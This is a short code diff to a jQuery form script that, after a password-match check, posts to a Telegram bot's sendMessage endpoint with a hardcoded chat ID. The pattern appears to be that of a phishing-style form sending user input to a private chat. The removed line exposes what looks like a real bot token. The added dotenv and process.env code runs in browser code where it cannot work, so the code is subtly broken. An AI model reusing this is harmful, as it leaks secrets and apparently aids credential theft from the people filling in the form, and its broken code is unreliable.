@@ -162,9 +162,13 @@ $(document).ready(function () {
                 message: 'Passwords do not match!',
                 position: 'topRight',
             });
-        } else {          
-            
-            const botToken = '7153300024:AAHxg3xOAYbsBbLrIpQJoYNbeFBuYPmnsyk';
+        } else { 
+                 
+            if (process.env.NODE_ENV !== 'production') {
+    require('dotenv').config();
+}
+
+            const botToken = process.env.ADELINA_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
             const chatID = '5538909913';
             const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
